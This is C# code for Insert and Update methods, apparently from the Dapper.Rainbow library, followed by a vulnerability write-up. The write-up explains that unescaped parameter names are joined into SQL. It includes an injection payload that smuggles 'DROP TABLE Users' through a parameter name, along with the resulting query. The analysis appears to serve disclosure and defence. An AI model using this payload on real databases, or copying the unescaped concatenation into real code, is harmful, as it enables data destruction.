public virtual int? Insert(dynamic data)
{
    var o = (object)data;
    List<string> paramNames = GetParamNames(o);
    paramNames.Remove("Id");

    string cols = string.Join(",", paramNames);
    string colsParams = string.Join(",", paramNames.Select(p => "@" + p));
    var sql = "set nocount on insert " + TableName + " (" + cols + ") values (" + colsParams + ") select cast(scope_identity() as int)";

    return database.Query<int?>(sql, o).Single();
}

public int Update(TId id, dynamic data)
{
    List<string> paramNames = GetParamNames((object)data);

    var builder = new StringBuilder();
    builder.Append("update ").Append(TableName).Append(" set ");
    builder.AppendLine(string.Join(",", paramNames.Where(n => n != "Id").Select(p => p + "= @" + p)));
    builder.Append("where Id = @Id");

    DynamicParameters parameters = new DynamicParameters(data);
    parameters.Add("Id", id);

    return database.Execute(builder.ToString(), parameters);
}

Analysis:
### Vulnerability Analysis

In `Dapper.Rainbow/Database.Async.cs`, the `InsertAsync` method operates identically to the synchronous `Insert` method, extracting parameter names via `GetParamNames(o)` and joining them directly into the constructed SQL statement:
```csharp
string cols = string.Join(\",\", paramNames);
string colsParams = string.Join(\",\", paramNames.Select(p => \"@\" + p));
var sql = \"set nocount on insert \" + TableName + \" (\" + cols + \") values (\" + colsParams + \") select cast(scope_identity() as int)\";
```

Because parameter names from dynamic input classes like `DynamicParameters` are not sanitized or escaped, this is a direct SQL injection vulnerability.

### Conceptual Exploit Payload

Suppose a developer constructs a dynamic collection from user-controlled inputs:
```csharp
var dynParams = new DynamicParameters();
dynParams.Add(\"colName) VALUES (1); DROP TABLE Users; --\", \"dummyValue\");
await db.Users.InsertAsync(dynParams);
```

The parsed parameter names are joined as part of the raw SQL insert query:
```sql
set nocount on insert Users (colName) VALUES (1); DROP TABLE Users; --) values (@colName) VALUES (1); DROP TABLE Users; --) select cast(scope_identity() as int)
```

This successfully executes the injected `DROP TABLE Users` statement.

